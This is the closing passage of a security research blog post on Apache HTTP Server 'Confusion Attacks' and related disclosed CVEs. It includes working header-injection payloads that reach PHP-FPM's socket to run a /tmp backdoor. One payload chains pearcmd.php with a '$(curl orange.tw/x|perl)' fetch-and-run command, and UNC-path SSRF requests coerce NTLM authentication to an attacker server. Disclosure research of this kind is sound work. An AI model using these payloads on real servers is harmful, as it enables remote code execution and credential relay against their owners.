<p>However, <code class="language-plaintext highlighter-rouge">mod_proxy</code> offers a more “convenient” feature — it can access local Unix Domain Sockets! 😉</p>

<p>Here’s a demonstration accessing PHP-FPM’s local Unix Domain Socket to execute a PHP backdoor located in <code class="language-plaintext highlighter-rouge">/tmp/</code>:</p>

<blockquote>
  <p>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a <br />
<strong><em>Location:/ooo</em></strong> %0d%0a <br />
<strong><em>Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php</em></strong> %0d%0a <br />
%0d%0a <br /></p>
</blockquote>

<p>Theoretically, this technique has even more potential, such as protocol smuggling (smuggling FastCGI in HTTP/HTTPS protocols 😏) or exploiting other vulnerable local sockets. These possibilities are left for interested readers to explore.</p>

<h5 id="️-3-2-4-arbitrary-handler-to-rce">✔️ 3-2-4. Arbitrary Handler to RCE</h5>

<p>Finally, let’s demonstrate how to transform this primitive into an RCE using a common CTF trick! Since the official <a href="https://hub.docker.com/_/php">PHP Docker</a> image includes PEAR, a command-line PHP package management tool, using its <code class="language-plaintext highlighter-rouge">Pearcmd.php</code> as an entry point allows us to achieve further exploitation. You can check this article — <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP LFI Summary</a>, written by <a href="https://x.com/phithon_xg">Phith0n</a> for details!</p>

<p>Here we utilize a Command Injection within <code class="language-plaintext highlighter-rouge">run-tests</code> to complete the entire exploit chain, detailed as follows:</p>

<blockquote>
  <p>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a <br />
<strong><em>Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php</em></strong> %0d%0a <br />
<strong><em>Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php</em></strong> %0d%0a <br />
%0d%0a <br /></p>
</blockquote>

<p>It’s common to see CRLF Injection or Header Injection being reported as XSS in Security Advisories or Bug Bounties. While it is true that these can sometimes chain to impactful vulnerabilities like Account Takeover through SSO, please don’t forget that they can also lead to Server-Side RCE, as this demonstration proves its potential!</p>

<p><img src="/assets/img/blog/20240809/10.png" alt="" /></p>

<p><br /></p>

<h3 id="-4-other-vulnerabilities">🔥 4. Other Vulnerabilities</h3>

<p>While this essentially covers the Confusion Attacks, some minor vulnerabilities discovered during our research of Apache HTTP Server are worth mentioning separately.</p>

<p><br /></p>

<h4 id="️-cve-2024-38472---windows-unc-based-ssrf">⚔️ CVE-2024-38472 - Windows UNC-based SSRF</h4>

<p>Firstly, the Windows implementation of the <code class="language-plaintext highlighter-rouge">apr_filepath_merge()</code> function allows the use of UNC paths, which allows attackers to coerce NTLM authentication to any host. Here we list two different triggering paths:</p>

<h5 id="️-triggered-via-http-request-parser">✔️ Triggered via HTTP Request Parser</h5>

<p>Direct triggering through an HTTP request parser in Httpd requires additional configuration, which might seem impractical at first glance but often appears with Tomcat (<code class="language-plaintext highlighter-rouge">mod_jk</code>, <code class="language-plaintext highlighter-rouge">mod_proxy_ajp</code>) or pairing with <a href="https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes">PATH_INFO</a>:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AllowEncodedSlashes</span> <span class="ss">On</span>
</code></pre></div></div>

<p>Additionally, since Httpd rewrote its core HTTP request parser logic after 2.4.49, triggering the vulnerability in versions above requires an additional configuration:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AllowEncodedSlashes</span> <span class="ss">On</span>
MergeSlashes <span class="ss">Off</span>
</code></pre></div></div>

<p>By using two <code class="language-plaintext highlighter-rouge">%5C</code> can force Httpd to coerce NTLM authentication to an <code class="language-plaintext highlighter-rouge">attacker-server</code>, and practically, this SSRF can be converted into RCE through <a href="https://en.hackndo.com/ntlm-relay/">NTLM Relay</a>!</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/%5C%5Cattacker-server/path/to
</code></pre></div></div>

<p><img src="/assets/img/blog/20240809/11.png" alt="" /></p>

<h5 id="️-triggered-via-type-map">✔️ Triggered via Type-Map</h5>

<p>In the <a href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235">Debian/Ubuntu</a> distribution of Httpd, Type-Map is enabled by default:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AddHandler</span> type-map <span class="ss">var</span>
</code></pre></div></div>

<p>By uploading a <code class="language-plaintext highlighter-rouge">.var</code> file to the server and setting the URI field to a UNC path, you can also force the server to coerce NTLM authentication to the attacker. This is also <a href="https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle">the second <code class="language-plaintext highlighter-rouge">.var</code> trick</a> I proposed. 😉</p>

<p><br /></p>

<h4 id="️-cve-2024-39573---ssrf-via-full-control-of-rewriterule-prefix">⚔️ CVE-2024-39573 - SSRF via Full Control of <code class="language-plaintext highlighter-rouge">RewriteRule</code> Prefix</h4>

<p>Lastly, when you have full control over the prefix of a <code class="language-plaintext highlighter-rouge">RewriteRule</code> substitution target in <code class="language-plaintext highlighter-rouge">Server Config</code> or <code class="language-plaintext highlighter-rouge">VirtualHost</code> is fully controllable, you can invoke <code class="language-plaintext highlighter-rouge">mod_proxy</code> and its sub-modules:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteRule</span> ^/broken(.*) $1
</code></pre></div></div>

<p>Using the following URL can delegate the request to <code class="language-plaintext highlighter-rouge">mod_proxy</code> for processing:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/brokenproxy:unix:/run/[...]|http://path/to
</code></pre></div></div>

<p>But if administrators have tested the rule properly, they would realize that such rules are impractical. Thus, originally it was reported along with another vulnerability as an exploit chain, but this behavior was also treated as a security boundary fix by the security team. As the patches came out, other researchers applied the same behavior to Windows UNC and obtained another additional CVE.</p>

<p><br /></p>

<h2 id="future-works">Future Works</h2>

<p>Finally, let’s talk about future works and areas for improvement in this research. Confusion Attacks are still a very promising attack surface, especially since my research focused mainly on just two fields. Unless the Apache HTTP Server undergoes architectural improvements or provides better development standards, I believe we’ll see more “confusions” in the future!</p>

<p>So, what other areas could be enhanced? In reality, different Httpd distributions have different configurations, so other Unix-Like systems such as the RHEL series, BSD family, and even applications that utilize Httpd might have more escapable <code class="language-plaintext highlighter-rouge">RewriteRule</code>, more powerful local gadgets, and unexpected symbolic jumps. These are all left for those interested to continue exploring.</p>

<p>Due to time constraints, I was unable to share more real-world cases found and exploited in actual websites, devices, or even open-source projects. However, you can probably imagine — the real world is still full of countless unexplored rules, bypassable authentications, and hidden CGIs waiting to be uncovered. How to hunt these techniques worldwide? That’s your mission!</p>

<p><br /></p>

<h2 id="conclusion">Conclusion</h2>

<p>Maintaining an open-source project is truly challenging, especially when trying to balance user convenience with the compatibility of older versions. A slight oversight can lead to the entire system being compromised, such as what happened with Httpd 2.4.49, where a minor change in path processing logic led to the disastrous <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773">CVE-2021-41773</a>. The entire development process must be carefully built upon a pile of legacy code and technical debt. So, if any Apache HTTP Server developers are reading this: Thank you for your hard work and contributions!</p>

                    </div>
                    <!-- 文章內容 -->
                </div>
            </article>
            <!-- 文章 end -->
        </section>
        
         <!-- 作者 -->
        <section>
            <div class="container article_footer">
                <div class="author_info">
                    <a href="/en/blog/author/orange">
                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/orange.png);"></div>
                    </a>
                    <div>
                        <a class="author" href="/en/blog/author/orange">
                            <h3>Orange Tsai</h3>
                        </a>
                        <span>Principal Security Researcher</span>
                        <p>
                            I am Orange : )
                        </p>
                    </div>
                </div>
            </div>
        </section>
        

    </div>

    <!-- footer -->
    <footer>
<div class="container footer">
    <div class="logo">
        <a href="/en/">
            <img src="/images/logo.svg"/>
        </a>
        <div class="social">
            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
        </div>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Services</h6>
        <ul>
            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
            <li><a href="/en/services/security-training/">Security Training</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Research</h6>
        <ul>
            <li><a href="/en/research/overview/">Overview</a></li>
            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
            <li><a href="/en/research/talks/">International Conferences</a></li>
            <li><a href="/en/research/cve/">CVE List</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Company</h6>
        <ul>
            <li><a href="/en/company/about/">Company Overview</a></li>
            <li><a href="/en/company/our-team/">Team Members</a></li>
            <li><a href="/en/company/history/">Achievements</a></li>
            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
            <li><a href="/en/contact/">Contact</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">News</h6>
        <ul>
            <li><a href="/en/blog/">Blog</a></li>
            <li><a href="/en/media-kit/">Media Resources</a></li>
        </ul>
    </div>

    <!-- divider 分隔線 -->
    <div class="divider"></div>

    <div class="copyright">
        <div class="info">
            <span>© 2025 DEVCORE <b class="line-block">All rights reserved.</b></span>
            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
        </div>
        <div class="lang">
            <!-- <i class="icon translate"></i>
            <select>
                <option value="">Language</option>
                <option value="">中文</option>
                <option value="">English</option>
            </select> -->
            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
        </div>
    </div>

</div>
    </footer>
</body>
</html>










